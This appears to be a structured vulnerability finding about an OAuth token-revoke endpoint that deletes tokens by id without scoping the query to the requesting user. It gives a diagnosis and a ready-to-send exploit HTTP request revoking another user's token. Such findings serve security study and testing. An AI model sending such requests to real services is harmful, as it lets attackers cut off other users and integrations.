diagnosis: The endpoint accepts a token_id in the request payload and deletes the corresponding AccessToken record without scoping the deletion query to request.user. An authenticated attacker can revoke active OAuth tokens issued to other users or background service integrations, causing selective service outages.
exploit_request:
POST /api/oauth/tokens/revoke/ HTTP/1.1
Host: auth.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"token_id": 9841}
